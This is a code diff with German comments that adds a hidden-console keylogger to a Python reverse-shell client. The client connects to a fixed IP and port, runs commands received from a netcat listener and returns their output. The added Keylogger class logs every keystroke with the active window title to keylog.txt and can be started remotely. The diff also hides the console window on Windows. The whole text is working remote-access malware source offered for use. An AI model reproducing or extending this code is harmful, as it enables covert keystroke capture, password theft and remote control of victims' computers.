@@ -9,15 +9,85 @@ import subprocess
 import tempfile
 import sys
 import base64
+import threading
+import tkinter as tk
+from tkinter import messagebox
+from pynput import keyboard
+
+# Hide console window on Windows
+if platform.system() == "Windows":
+    import ctypes
+    # Hide console window
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# Try to import optional dependencies
+try:
+    import pyautogui
+except ImportError:
+    pyautogui = None
+    print("[!] pyautogui nicht installiert. Einige Funktionen werden nicht verfügbar sein.")
+
+try:
+    from win32gui import GetWindowText, GetForegroundWindow
+except ImportError:
+    GetWindowText = GetForegroundWindow = None
+    print("[!] win32gui nicht installiert. Fenstertitel werden nicht erfasst.")
 
 try:
     from PIL import ImageGrab
 except ImportError:
     ImageGrab = None
+    print("[!] PIL nicht installiert. Screenshots werden nicht verfügbar sein.")
 
 # Server-Konfiguration
 HOST_IP = "192.168.178.76"
 PORT = 8080
+
+class Keylogger:
+    def __init__(self):
+        self.is_logging = False
+        self.log_file = None
+        self.listener = None
+
+    def start_logging(self):
+        if self.is_logging:
+            return
+        self.is_logging = True
+        self.log_file = open("keylog.txt", "a", encoding="utf-8")
+        self.log_file.write(f"\n=== Keylogger gestartet: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.daemon = True
+        self.listener.start()
+
+    def stop_logging(self):
+        if self.listener:
+            self.listener.stop()
+            self.listener = None
+        if self.log_file:
+            self.log_file.write(f"=== Keylogger gestoppt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
+            self.log_file.close()
+            self.log_file = None
+        self.is_logging = False
+
+    def on_key_press(self, key):
+        if self.is_logging and self.log_file:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            # Aktives Fenster ermitteln
+            window = "Unbekannt"
+            if GetWindowText and GetForegroundWindow:
+                try:
+                    window = GetWindowText(GetForegroundWindow())
+                except:
+                    pass
+            # Taste als lesbarer String
+            if hasattr(key, 'char') and key.char is not None:
+                key_str = key.char
+            else:
+                key_str = str(key).replace('Key.', '').upper()
+            # Logformat: Zeit | Fenster | Taste
+            log_line = f"[{timestamp}] | [{window}] | {key_str}\n"
+            self.log_file.write(log_line)
+            self.log_file.flush()
 
 # Benutzerdefinierte Befehle und ihre Beschreibungen
 COMMANDS = {
@@ -72,6 +142,9 @@ COMMANDS = {
         "echo <text>": "Text zurückgeben",
         "reverse <text>": "Text rückwärts ausgeben",
         "help": "Hilfe anzeigen"
+    },
+    "Keylogger": {
+        "keylogger": "Keylogger-Funktionen"
     }
 }
 
@@ -320,7 +393,23 @@ def process_custom_command(command):
             return f"[Datei '{path}' hochgeladen]"
         except Exception as e:
             return f"[Fehler beim Upload: {e}]"
-        
+
+    elif base_cmd == "keylogger":
+        if args == "start":
+            if not hasattr(process_custom_command, 'keylogger'):
+                process_custom_command.keylogger = Keylogger()
+            process_custom_command.keylogger.start_logging()
+            return "[Keylogger gestartet, Logfile: keylog.txt]"
+        elif args == "stop":
+            if hasattr(process_custom_command, 'keylogger'):
+                process_custom_command.keylogger.stop_logging()
+                return "[Keylogger gestoppt]"
+        elif args == "status":
+            if hasattr(process_custom_command, 'keylogger'):
+                status = "aktiv" if process_custom_command.keylogger.is_logging else "inaktiv"
+                return f"[Keylogger Status: {status}]"
+        return "[Keylogger Befehle: start, stop, status]"
+
     return None # Befehl nicht gefunden
 
 def main():
@@ -345,11 +434,9 @@ Current Directory: {os.getcwd()}
             
             while True:
                 # Empfange Befehl vom Netcat Listener
-                # Empfange bis zu 4096 Bytes
                 command = s.recv(4096).decode().strip()
                 
                 if not command:
-                    # Verbindung wurde geschlossen oder kein Befehl empfangen
                     break
                     
                 # Versuche zuerst, einen benutzerdefinierten Befehl zu verarbeiten
@@ -359,9 +446,7 @@ Current Directory: {os.getcwd()}
                 if output is None:
                     output = execute_system_command(command)
 
-                # Sende Ergebnis zurück an den Netcat Listener
-                # Füge ein Newline am Ende hinzu, um sicherzustellen, dass Netcat die Ausgabe anzeigt
-                # Stelle sicher, dass die Ausgabe immer ein String ist, bevor sie gesendet wird
+                # Sende Ergebnis zurück
                 if not isinstance(output, str):
                     output = str(output)
                     
@@ -372,14 +457,13 @@ Current Directory: {os.getcwd()}
                     
         except Exception as e:
             print(f"[-] Fehler: {e}")
-            time.sleep(5) # Warte 5 Sekunden vor dem erneuten Verbinden
+            time.sleep(5)
             continue
         finally:
-            # Stelle sicher, dass der Socket geschlossen wird
             s.close()
             
         print("[*] Verbindung getrennt. Versuche erneut zu verbinden...")
-        time.sleep(5) # Warte 5 Sekunden vor dem erneuten Verbinden
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
